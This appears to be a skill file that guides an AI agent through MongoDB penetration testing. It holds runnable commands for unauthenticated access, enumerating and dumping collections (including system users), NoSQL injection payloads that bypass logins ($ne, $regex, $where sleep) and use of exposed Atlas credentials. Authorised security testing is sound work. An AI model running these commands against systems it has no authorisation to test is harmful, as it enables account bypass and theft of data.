---
name: tech-mongodb
description: "MongoDB security testing — unauthenticated access, collection enumeration, NoSQL injection, data exfiltration, MongoDB bind IP misconfiguration. Triggers: 'mongodb', 'mongodb security', 'mongodb pentest', 'mongodb unauth', 'mongodb injection', 'nosql mongo', 'mongodb exploit', 'mongo db pentest'."
---

# MongoDB Security Testing

Test MongoDB for authentication bypass and data exposure.

---

## Phase 1: Discovery & Unauthenticated Access

```bash
TARGET="TARGET_IP"

# Detect MongoDB:
nmap -p 27017,27018,27019 -sV "$TARGET" 2>/dev/null

# Test unauthenticated:
mongo --host "$TARGET" --port 27017 --eval "db.adminCommand({listDatabases: 1})" 2>/dev/null | tee output/mongo_dbs.txt

# Via mongosh:
mongosh --host "$TARGET" --quiet --eval "show dbs" 2>/dev/null | tee output/mongo_dbs.txt

# Direct query:
echo 'db.adminCommand({listDatabases: 1})' | mongo "$TARGET:27017" --quiet 2>/dev/null
```

---

## Phase 2: Data Enumeration

```bash
TARGET="TARGET_IP"

# List databases and collections:
mongosh --host "$TARGET" --quiet << 'EOF'
const dbs = db.adminCommand({listDatabases: 1}).databases;
dbs.forEach(d => {
  db = db.getSiblingDB(d.name);
  const colls = db.getCollectionNames();
  print(`DB: ${d.name} — Collections: ${colls.join(', ')}`);
});
EOF

# Dump collection:
mongosh --host "$TARGET" --quiet << 'EOF'
use target_db;
db.users.find({}).limit(10).forEach(printjson);
EOF

# Find with credentials:
mongosh --host "$TARGET" -u admin -p password --quiet << 'EOF'
use admin;
db.system.users.find({}).forEach(printjson);
EOF

# mongoexport:
mongoexport --host "$TARGET" --db "target_db" --collection "users" \
  --out output/mongo_users.json 2>/dev/null
```

---

## Phase 3: MongoDB Authentication Bypass

```bash
TARGET="https://TARGET"

# NoSQL injection (see vuln-nosql for full details):
# Login bypass:
curl -s -X POST "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'

# Where clause bypass:
curl -s "$TARGET/api/users?username[$ne]=invalid"

# Regex user enumeration:
for CHAR in a b c d e f g h i j k l m n o p q r s t u v w x y z; do
  RESP=$(curl -s "$TARGET/api/users?username[$regex]=^$CHAR" 2>/dev/null | wc -c)
  echo "$CHAR → $RESP bytes"
done | sort -t'>' -k2 -rn | head -5

# Time-based blind:
curl -s "$TARGET/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$where": "sleep(3000)"}}'
```

---

## Phase 4: Cloud MongoDB (Atlas)

```bash
# Test exposed Atlas connection string (from JS/config):
# mongodb+srv://user:pass@cluster.mongodb.net/

# Check exposed MongoDB Atlas API keys:
curl -s "https://cloud.mongodb.net/api/atlas/v1.0/orgs" \
  -u "PUBLIC_KEY:PRIVATE_KEY" --digest 2>/dev/null | jq .

# Compass connection (found creds):
# Connect: mongodb://user:pass@TARGET:27017/admin
```

---

## Output

Save to `output/`:
- `mongo_dbs.txt` — database listing
- `mongo_users.json` — exported user collection

## Next Phase

→ `vuln-nosql` for advanced injection techniques
→ `pentest-report` to document MongoDB findings
